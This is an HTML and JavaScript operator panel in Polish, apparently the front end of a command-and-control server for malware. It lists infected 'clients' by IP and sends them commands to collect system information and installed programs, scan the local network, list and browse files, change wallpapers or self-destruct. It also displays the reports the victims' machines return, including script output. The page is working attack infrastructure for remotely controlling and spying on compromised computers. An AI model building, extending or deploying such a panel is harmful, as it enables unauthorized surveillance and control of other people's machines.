<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZarzƒÖdzanie Serwerem C&C</title>
    <style>
        :root {
            --bg-color: #121212;
            --text-color: #e0e0e0;
            --primary-color: #00aaff;
            --secondary-color: #2c2c2c;
            --card-bg: #1e1e1e;
            --green: #4caf50;
            --red: #f44336;
            --yellow: #ffeb3b;
            --cyan: #00bcd4;
            --magenta: #e91e63;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }

        .container {
            max-width: 900px;
            margin: auto;
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        h1, h2 {
            text-align: center;
            color: var(--primary-color);
        }

        .card {
            background-color: var(--card-bg);
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
        }

        .client-list, .command-panel {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .client-item {
            background-color: var(--secondary-color);
            padding: 10px 15px;
            border-radius: 8px;
            border: 1px solid transparent;
            cursor: pointer;
            transition: background-color 0.3s, border-color 0.3s;
            display: flex;
            flex-direction: column;
            gap: 5px;
        }

        .client-item.active {
            border-color: var(--primary-color);
            background-color: #383838;
        }
        
        .client-item:hover {
            background-color: #383838;
        }

        .client-item h3 {
            margin: 0;
            color: var(--green);
        }

        .client-item p {
            margin: 0;
            font-size: 0.9em;
            color: #b0b0b0;
        }

        .command-panel select, .command-panel input, .command-panel button {
            padding: 10px;
            border-radius: 5px;
            border: 1px solid var(--secondary-color);
            background-color: var(--bg-color);
            color: var(--text-color);
        }

        .command-panel button, .client-action-btn {
            background-color: var(--primary-color);
            border: none;
            cursor: pointer;
            font-weight: bold;
            transition: background-color 0.3s;
            padding: 10px;
            border-radius: 5px;
            margin-top: 10px;
        }

        .command-panel button:hover, .client-action-btn:hover {
            background-color: #0088cc;
        }

        .report-log {
            height: 400px;
            overflow-y: scroll;
            background-color: var(--bg-color);
            padding: 15px;
            border-radius: 8px;
            border: 1px solid var(--secondary-color);
        }

        .log-entry {
            margin: 0;
            font-family: 'Courier New', Courier, monospace;
            white-space: pre-wrap;
            word-wrap: break-word;
        }

        .log-green { color: var(--green); }
        .log-yellow { color: var(--yellow); }
        .log-red { color: var(--red); }
        .log-cyan { color: var(--cyan); }
        .log-magenta { color: var(--magenta); }
        .log-blue { color: #007bff; }
        .log-white { color: var(--text-color); }
        .log-server { color: #8a2be2; }

        .form-group {
            display: flex;
            flex-direction: column;
            gap: 5px;
        }

        .form-group.row {
            flex-direction: row;
            gap: 10px;
        }
        
        .form-group.row input {
            flex-grow: 1;
        }

        /* File Explorer Modal */
        .modal {
            display: none;
            position: fixed;
            z-index: 100;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0,0,0,0.8);
            backdrop-filter: blur(5px);
        }

        .modal-content {
            background-color: var(--card-bg);
            margin: 5% auto;
            padding: 20px;
            border: 1px solid var(--secondary-color);
            width: 80%;
            max-width: 700px;
            border-radius: 10px;
            position: relative;
            max-height: 80vh;
            display: flex;
            flex-direction: column;
        }

        .modal-close {
            color: #aaa;
            position: absolute;
            top: 10px;
            right: 20px;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }

        .modal-close:hover, .modal-close:focus {
            color: var(--red);
            text-decoration: none;
        }

        .file-tree-container {
            margin-top: 20px;
            padding-right: 15px;
            overflow-y: auto;
        }

        .file-tree-container ul {
            list-style-type: none;
            padding-left: 15px;
        }

        .file-tree-container ul li {
            position: relative;
            margin-bottom: 5px;
            cursor: pointer;
        }

        .file-tree-container ul li.directory::before {
            content: 'üìÇ';
            margin-right: 5px;
        }

        .file-tree-container ul li.file::before {
            content: 'üìÑ';
            margin-right: 5px;
        }

        .file-tree-container ul li.file-exe::before { content: '‚öôÔ∏è'; }
        .file-tree-container ul li.file-zip::before { content: 'üì¶'; }
        .file-tree-container ul li.file-img::before { content: 'üñºÔ∏è'; }
        .file-tree-container ul li.file-txt::before { content: 'üìù'; }
        .file-tree-container ul li.file-pdf::before { content: 'üìÑ'; }

        .file-tree-container .folder-name {
            font-weight: bold;
        }

        .file-tree-container .file-size {
            font-size: 0.8em;
            color: #888;
            margin-left: 10px;
        }

        @media (max-width: 768px) {
            .container {
                padding: 10px;
            }
            .form-group.row {
                flex-direction: column;
            }
            .modal-content {
                width: 95%;
                margin: 5% auto;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Panel ZarzƒÖdzania Serwerem C&C</h1>
        
        <div class="card">
            <h2>Klienci</h2>
            <div id="client-list" class="client-list">
                <p>≈Åadowanie klient√≥w...</p>
            </div>
            
            <hr>
            
            <h2>Wysy≈Çanie Komend</h2>
            <div class="command-panel">
                <div class="form-group">
                    <label for="command-client-ip">Wybierz klienta:</label>
                    <select id="command-client-ip">
                        <option value="all">Wszyscy klienci</option>
                    </select>
                </div>

                <div class="form-group">
                    <label for="command-type">Wybierz komendƒô:</label>
                    <select id="command-type">
                        <option value="get-info">Pobierz informacje systemowe</option>
                        <option value="lan-print">Skanuj sieƒá LAN</option>
                        <option value="list-files">Wy≈õwietl pliki</option>
                        <option value="change-wallpaper">Zmie≈Ñ tapetƒô</option>
                        <option value="self-destruct">Auto-destrukcja</option>
                    </select>
                </div>
                
                <div class="form-group" id="extra-data-group" style="display:none;">
                    <label for="extra-data-input">Dodatkowe dane (np. ≈õcie≈ºka):</label>
                    <input type="text" id="extra-data-input" placeholder="Wpisz tutaj dane...">
                </div>

                <button id="send-command-btn">Wy≈õlij Komendƒô</button>
            </div>
        </div>
        
        <div class="card">
            <h2>Dziennik Raport√≥w</h2>
            <div class="report-log" id="report-output">
            </div>
        </div>
    </div>

    <div id="file-explorer-modal" class="modal">
        <div class="modal-content">
            <span class="modal-close">&times;</span>
            <h2 id="modal-title">Struktura Plik√≥w</h2>
            <div class="file-tree-container">
                <div id="file-tree"></div>
            </div>
        </div>
    </div>

    <script>
        const API_URL = window.location.origin;

        const clientListDiv = document.getElementById('client-list');
        const commandClientSelect = document.getElementById('command-client-ip');
        const commandTypeSelect = document.getElementById('command-type');
        const sendCommandBtn = document.getElementById('send-command-btn');
        const extraDataGroup = document.getElementById('extra-data-group');
        const extraDataInput = document.getElementById('extra-data-input');
        const reportOutput = document.getElementById('report-output');

        const fileExplorerModal = document.getElementById('file-explorer-modal');
        const fileTreeDiv = document.getElementById('file-tree');
        const modalTitle = document.getElementById('modal-title');
        const modalCloseBtn = document.querySelector('.modal-close');

        // Global state to store file tree data
        let clientFileTrees = {};

        function logMessage(message, colorClass = 'log-white') {
            const logEntry = document.createElement('pre');
            logEntry.className = `log-entry ${colorClass}`;
            logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            reportOutput.appendChild(logEntry);
            reportOutput.scrollTop = reportOutput.scrollHeight;
        }

        async function fetchClients() {
            try {
                const response = await fetch(`${API_URL}/clients`);
                if (!response.ok) throw new Error('Network response was not ok');
                const clients = await response.json();
                
                clientListDiv.innerHTML = '';
                commandClientSelect.innerHTML = '<option value="all">Wszyscy klienci</option>';

                if (Object.keys(clients).length === 0) {
                    clientListDiv.innerHTML = '<p>Brak pod≈ÇƒÖczonych klient√≥w.</p>';
                    return;
                }

                for (const ip in clients) {
                    const details = clients[ip];
                    const lastSeen = new Date(details.last_seen * 1000).toLocaleString();
                    
                    const clientItem = document.createElement('div');
                    clientItem.className = 'client-item';
                    clientItem.innerHTML = `<h3>${ip} <span style="font-size:0.8em; color:#888;">(v${details.version})</span></h3>
                                            <p>Status: ${details.status}</p>
                                            <p>Ostatnio widziany: ${lastSeen}</p>`;
                    
                    // Add 'PrzeglƒÖdaj pliki' button if file tree data exists for this client
                    if (clientFileTrees[ip]) {
                         const browseBtn = document.createElement('button');
                         browseBtn.className = 'client-action-btn';
                         browseBtn.textContent = 'PrzeglƒÖdaj pliki';
                         browseBtn.onclick = () => showFileExplorer(ip);
                         clientItem.appendChild(browseBtn);
                    }
                                            
                    clientListDiv.appendChild(clientItem);

                    const option = document.createElement('option');
                    option.value = ip;
                    option.textContent = ip;
                    commandClientSelect.appendChild(option);
                }
            } catch (error) {
                clientListDiv.innerHTML = `<p style="color:var(--red);">B≈ÇƒÖd: Nie mo≈ºna po≈ÇƒÖczyƒá siƒô z serwerem API. ${error.message}</p>`;
            }
        }
        
        function checkExtraDataVisibility() {
            const commandType = commandTypeSelect.value;
            if (['list-files', 'change-wallpaper'].includes(commandType)) {
                extraDataGroup.style.display = 'flex';
                extraDataInput.placeholder = 'Wpisz ≈õcie≈ºkƒô...';
            } else if (commandType === 'transfer-file') {
                extraDataGroup.style.display = 'flex';
                extraDataInput.placeholder = 'Wybierz plik do przes≈Çania...';
            } else {
                extraDataGroup.style.display = 'none';
                extraDataInput.value = '';
            }
        }

        async function sendCommand() {
            const clientIP = commandClientSelect.value;
            const commandType = commandTypeSelect.value;
            const extraData = extraDataInput.value;
            
            const payload = {
                type: commandType,
                data: {}
            };
            
            if (extraDataGroup.style.display !== 'none') {
                payload.data = { path: extraData };
            }

            if (commandType === 'self-destruct' && !confirm(`Jeste≈õ pewien, ≈ºe chcesz zniszczyƒá klienta${clientIP === 'all' ? " WSZYSTKICH klient√≥w" : ""}?`)) {
                return;
            }
            
            const endpoint = clientIP === 'all' ? '/send_command_to_all' : '/send_command';
            const body = {
                command: payload
            };
            if (clientIP !== 'all') {
                body.client_ip = clientIP;
            }

            logMessage(`[SERWER] Wysy≈Çanie komendy '${commandType}' do ${clientIP === 'all' ? 'wszystkich klient√≥w' : clientIP}...`, 'log-server');

            try {
                const response = await fetch(`${API_URL}${endpoint}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(body)
                });
                if (!response.ok) throw new Error('Failed to send command');
                
                const result = await response.json();
                logMessage(`[SERWER] ${result.message}`, 'log-green');
            } catch (error) {
                logMessage(`[SERWER] B≈ÇƒÖd: Nie mo≈ºna wys≈Çaƒá polecenia. ${error.message}`, 'log-red');
            }
        }

        async function fetchReports() {
            try {
                const response = await fetch(`${API_URL}/get_reports`);
                if (!response.ok) throw new Error('Failed to fetch reports');
                const reports = await response.json();
                
                reports.forEach(report => {
                    let logClass = 'log-white';
                    let logMessage = `[${report.client_ip}] -> ${report.status}`;

                    switch (report.status) {
                        case 'new_connection':
                            logClass = 'log-green';
                            logMessage = `[SERWER] Klient [${report.client_ip}] po≈ÇƒÖczony pomy≈õlnie.`;
                            break;
                        case 'lan-scan-complete':
                            logClass = 'log-cyan';
                            logMessage = `[RAPORT] [${report.client_ip}] -> Wyniki skanowania sieci LAN:\n  ‚Ä¢ ${report.info.lan_devices.join('\n  ‚Ä¢ ')}`;
                            break;
                        case 'system-info-complete':
                            logClass = 'log-magenta';
                            logMessage = `[RAPORT] [${report.client_ip}] [INFO SYSTEMOWE] Zgromadzone dane:\n  ‚Ä¢ System operacyjny: ${report.info.os}\n  ‚Ä¢ Katalog domowy: ${report.info.home_directory}\n  ‚Ä¢ Zainstalowane programy: ${report.info.installed_programs.slice(0, 5).join(', ')}...`;
                            break;
                        case 'file-list-complete':
                            logClass = 'log-blue';
                            logMessage = `[RAPORT] [${report.client_ip}] -> Struktura plik√≥w dla ≈õcie≈ºki '${report.info.path}' zosta≈Ça pobrana.`;
                            clientFileTrees[report.client_ip] = report.info;
                            fetchClients(); // Refresh client list to show 'PrzeglƒÖdaj' button
                            break;
                        case 'script-output':
                            logClass = 'log-yellow';
                            logMessage = `[RAPORT] [${report.client_ip}] -> Wynik wykonania skryptu:\n${report.info.output}`;
                            break;
                        case 'file-transfer-complete':
                        case 'wallpaper-change-complete':
                            logClass = 'log-green';
                            logMessage = `[RAPORT] [${report.client_ip}] -> ${report.status.replace(/-/g, ' ')}`;
                            break;
                        case 'wallpaper-change-error':
                        case 'file-transfer-error':
                            logClass = 'log-red';
                            logMessage = `[RAPORT] [${report.client_ip}] -> B≈ÇƒÖd: ${report.info.error}`;
                            break;
                        case 'self-destruct':
                            logClass = 'log-red';
                            logMessage = `[RAPORT] [${report.client_ip}] -> Samozniszczenie rozpoczƒôte.`;
                            break;
                        default:
                            if (report.status.includes('error')) {
                                logClass = 'log-red';
                            } else if (report.status.includes('complete')) {
                                logClass = 'log-green';
                            }
                            logMessage = `[RAPORT] [${report.client_ip}] -> ${report.status.replace(/-/g, ' ')}`;
                    }
                    
                    const logEntry = document.createElement('pre');
                    logEntry.className = `log-entry ${logClass}`;
                    logEntry.textContent = `[${new Date(report.time * 1000).toLocaleTimeString()}] ${logMessage}`;
                    reportOutput.appendChild(logEntry);
                    reportOutput.scrollTop = reportOutput.scrollHeight;
                });

            } catch (error) {
                console.error('Error fetching reports:', error);
            }
        }

        // Functions for the file explorer modal
        function showFileExplorer(ip) {
            const clientData = clientFileTrees[ip];
            if (!clientData) {
                alert('Brak danych o plikach dla tego klienta. Proszƒô wys≈Çaƒá komendƒô "Wy≈õwietl pliki" najpierw.');
                return;
            }
            modalTitle.textContent = `Struktura Plik√≥w dla: ${ip} (≈öcie≈ºka: ${clientData.path})`;
            fileTreeDiv.innerHTML = '';
            const rootUl = document.createElement('ul');
            renderFileTree(clientData.file_tree, rootUl);
            fileTreeDiv.appendChild(rootUl);
            fileExplorerModal.style.display = 'block';
        }

        function renderFileTree(tree, parentElement) {
            for (const key in tree) {
                const item = tree[key];
                const li = document.createElement('li');
                
                if (item.type === 'directory') {
                    li.className = 'directory';
                    li.innerHTML = `<span class="folder-name">${key}</span>`;
                    const subUl = document.createElement('ul');
                    li.appendChild(subUl);
                    renderFileTree(item.contents, subUl);
                } else if (item.type === 'file') {
                    const extension = key.split('.').pop().toLowerCase();
                    let fileClass = 'file';
                    
                    switch(extension) {
                        case 'exe': case 'bat': case 'sh': fileClass += ' file-exe'; break;
                        case 'zip': case 'rar': case '7z': fileClass += ' file-zip'; break;
                        case 'jpg': case 'jpeg': case 'png': case 'gif': fileClass += ' file-img'; break;
                        case 'txt': case 'log': fileClass += ' file-txt'; break;
                        case 'pdf': fileClass += ' file-pdf'; break;
                    }

                    const sizeInKB = (item.size_bytes / 1024).toFixed(2);
                    li.className = fileClass;
                    li.innerHTML = `${key} <span class="file-size">(${sizeInKB} KB)</span>`;
                }
                
                parentElement.appendChild(li);
            }
        }

        function closeFileExplorer() {
            fileExplorerModal.style.display = 'none';
        }

        // Event Listeners
        commandTypeSelect.addEventListener('change', checkExtraDataVisibility);
        sendCommandBtn.addEventListener('click', sendCommand);
        modalCloseBtn.addEventListener('click', closeFileExplorer);

        // Close modal when clicking outside of it
        window.onclick = (event) => {
            if (event.target === fileExplorerModal) {
                closeFileExplorer();
            }
        };

        // Initial calls
        checkExtraDataVisibility();
        fetchClients();
        setInterval(fetchClients, 5000);
        setInterval(fetchReports, 1000);
        
        logMessage("Witamy w Panelu ZarzƒÖdzania Serwerem C&C. Odpowiedzi od klient√≥w pojawiƒÖ siƒô w Dzienniku Raport√≥w.", 'log-server');
    </script>
</body>
</html>
